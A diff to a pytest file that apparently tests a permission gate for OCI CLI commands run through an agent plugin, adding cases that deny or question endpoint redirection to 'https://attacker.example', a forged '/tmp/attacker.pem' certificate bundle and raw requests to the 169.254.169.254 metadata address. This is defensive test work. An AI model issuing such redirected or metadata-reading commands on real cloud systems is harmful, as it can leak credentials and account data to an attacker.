@@ -72,9 +72,17 @@ FORMS = [
  ('oci compute instance list --limit', 'ask'),
  ('oci compute instance list --limit 1 --limit 2', 'ask'),
  ('oci unknown service operation', 'ask'),
- ('oci raw-request --http-method GET --target-uri https://example.invalid', 'allow'),
- ('oci raw-request --http-method HEAD --target-uri https://example.invalid', 'allow'),
- ('oci raw-request --http-method POST --target-uri https://example.invalid', 'ask'),
+ ('oci raw-request --http-method GET --target-uri https://objectstorage.us-ashburn-1.oci.oraclecloud.com/n/x', 'allow'),
+ ('oci raw-request --http-method HEAD --target-uri https://identity.us-ashburn-1.oci.oraclecloud.com/20160918/regions', 'allow'),
+ ('oci raw-request --http-method POST --target-uri https://objectstorage.us-ashburn-1.oci.oraclecloud.com/n/x', 'ask'),
+ ('oci raw-request --http-method GET --target-uri https://example.invalid', 'ask'),
+ ('oci raw-request --http-method GET --target-uri http://169.254.169.254/opc/v1/instance/', 'ask'),
+ ('oci os ns get --endpoint https://attacker.example', 'deny'),
+ ('oci os ns get --endpoint http://identity.us-ashburn-1.oci.oraclecloud.com', 'deny'),
+ ('oci identity-domains identity-providers list --endpoint https://idcs-a1b2.identity.oraclecloud.com', 'allow'),
+ ('oci identity-domains identity-providers list --endpoint "$DOMAIN_URL"', 'ask'),
+ ('oci kms management key list --endpoint https://example-management.kms.us-ashburn-1.oraclecloud.com', 'allow'),
+ ('oci os ns get --cert-bundle /tmp/attacker.pem', 'deny'),
  ('terraform plan', None),
  ('terraform apply', 'ask'),
  ('terraform destroy', 'ask'),
@@ -91,7 +99,7 @@ FORMS = [
  ('${CLAUDE_PLUGIN_ROOT}/scripts/report.sh compute instance terminate', 'ask'),
  ('oci compute instance list # oci os bucket delete', 'allow'),
 ]
-assert len(FORMS) == 60
+assert len(FORMS) == 68
 
 
 @pytest.mark.parametrize('command,expected', FORMS)
@@ -205,8 +213,13 @@ def test_wrapper_contract_json_bounds_and_refusals(monkeypatch, tmp_path):
     assert '--output' in observed[0]
     assert not run(['compute', 'instance', 'terminate'])['ok']
     assert not run(['compute', 'instance', 'list', '--all'])['ok']
-    assert check(['raw-request', '--http-method', 'GET', '--target-uri', 'https://example.invalid'])[0]
-    assert not check(['raw-request', '--http-method', 'POST', '--target-uri', 'https://example.invalid'])[0]
+    assert check(['raw-request', '--http-method', 'GET', '--target-uri', 'https://objectstorage.us-ashburn-1.oci.oraclecloud.com/n/x'])[0]
+    assert not check(['raw-request', '--http-method', 'POST', '--target-uri', 'https://objectstorage.us-ashburn-1.oci.oraclecloud.com/n/x'])[0]
+    assert not check(['raw-request', '--http-method', 'GET', '--target-uri', 'https://example.invalid'])[0]
+    assert not check(['raw-request', '--http-method', 'GET', '--target-uri', 'http://169.254.169.254/opc/v1/instance/'])[0]
+    assert check(['identity-domains', 'identity-providers', 'list', '--endpoint', 'https://idcs-a1b2.identity.oraclecloud.com'])[0]
+    assert not check(['os', 'ns', 'get', '--endpoint', 'https://attacker.example'])[0]
+    assert not check(['os', 'ns', 'get', '--cert-bundle', '/tmp/attacker.pem'])[0]
     file = tmp_path / 'args.json'
     file.write_text('{"compartmentId":"example","limit":1}')
     argv = prepare(['compute', 'instance', 'list', '--from-json', file.as_uri()])
